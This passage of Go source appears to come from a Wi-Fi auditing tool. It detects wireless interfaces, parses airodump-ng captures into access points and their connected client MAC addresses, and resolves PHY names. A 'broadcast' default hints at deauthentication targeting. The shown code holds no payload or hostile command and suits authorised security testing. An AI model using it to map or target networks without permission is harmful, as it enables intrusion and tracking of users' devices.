			if len(line) > 0 && line[0] != ' ' && line[0] != '\t' {
				if i := strings.Index(line, ":"); i > 0 {
					currentIface = line[:i]
				}
			}
			if currentIface != "" && strings.Contains(line, "IEEE 802.11") {
				ifaces = append(ifaces, currentIface)
				currentIface = ""
			}
		}
		if len(ifaces) > 0 {
			return ifaces
		}
	}
	// macOS fallback via networksetup
	out, _ := exec.Command("networksetup", "-listallhardwareports").Output()
	var ifaces []string
	isWireless := false
	for _, line := range strings.Split(string(out), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "Hardware Port:") {
			portName := strings.ToLower(strings.TrimPrefix(trimmed, "Hardware Port:"))
			isWireless = strings.Contains(portName, "wi-fi") ||
				strings.Contains(portName, "airport") ||
				strings.Contains(portName, "wireless") ||
				strings.Contains(portName, "802.11")
		}
		if isWireless && strings.HasPrefix(trimmed, "Device:") {
			if dev := strings.TrimSpace(strings.TrimPrefix(trimmed, "Device:")); dev != "" {
				ifaces = append(ifaces, dev)
			}
			isWireless = false
		}
	}
	return ifaces
}

func pickInterface(label string) string {
	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found.")
		return ""
	}
	idx := ui.Select(label, ifaces)
	if idx < 0 {
		return ""
	}
	return ifaces[idx]
}

func parseAirodumpCSV(path string) ([]wifiNetwork, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	raw, err := io.ReadAll(f)
	if err != nil {
		return nil, err
	}

	content := string(raw)
	// airodump-ng uses \r\n; try both separators for the section break
	sections := strings.SplitN(content, "\r\n\r\n", 2)
	if len(sections) < 2 {
		sections = strings.SplitN(content, "\n\n", 2)
	}

	networks := map[string]*wifiNetwork{}

	if len(sections) > 0 {
		r := csv.NewReader(strings.NewReader(sections[0]))
		r.FieldsPerRecord = -1
		r.TrimLeadingSpace = true
		records, _ := r.ReadAll()
		for i, rec := range records {
			if i == 0 || len(rec) < 14 {
				continue
			}
			bssid := strings.TrimSpace(rec[0])
			if bssid == "" || bssid == "BSSID" {
				continue
			}
			essid := strings.TrimSpace(rec[13])
			if essid == "" {
				essid = "<hidden>"
			}
			networks[bssid] = &wifiNetwork{
				BSSID:      bssid,
				Channel:    strings.TrimSpace(rec[3]),
				Signal:     strings.TrimSpace(rec[8]),
				Encryption: strings.TrimSpace(rec[5]),
				ESSID:      essid,
			}
		}
	}

	if len(sections) > 1 {
		r := csv.NewReader(strings.NewReader(sections[1]))
		r.FieldsPerRecord = -1
		r.TrimLeadingSpace = true
		recs, _ := r.ReadAll()
		for i, rec := range recs {
			if i == 0 || len(rec) < 6 {
				continue
			}
			mac := strings.TrimSpace(rec[0])
			ap := strings.TrimSpace(rec[5])
			if n, ok := networks[ap]; ok && mac != "" {
				n.Clients = append(n.Clients, mac)
			}
		}
	}

	result := make([]wifiNetwork, 0, len(networks))
	for _, n := range networks {
		result = append(result, *n)
	}
	return result, nil
}

// getPhyForIface returns the PHY name (e.g. "phy0") for an interface from `iw dev`.
func getPhyForIface(iface string) string {
	out, err := exec.Command("iw", "dev").Output()
	if err != nil {
		return ""
	}
	currentPhy := ""
	for _, line := range strings.Split(string(out), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "phy#") {
			currentPhy = "phy" + strings.TrimPrefix(trimmed, "phy#")
		}
		if strings.HasPrefix(trimmed, "Interface ") {
			if strings.TrimPrefix(trimmed, "Interface ") == iface {
				return currentPhy
			}
		}
	}
	return ""
}

func orBroadcast(s string) string {
	if s == "" {
		return "broadcast"
	}
	return s
}

func sanitize(s string) string {
	var sb strings.Builder
	for _, r := range strings.ToLower(s) {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			sb.WriteRune(r)
		} else {
			sb.WriteRune('_')
		}
	}
	if result := sb.String(); result != "" {
		return result
	}
	return "network"
}

func wTrunc(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-1] + "…"
}
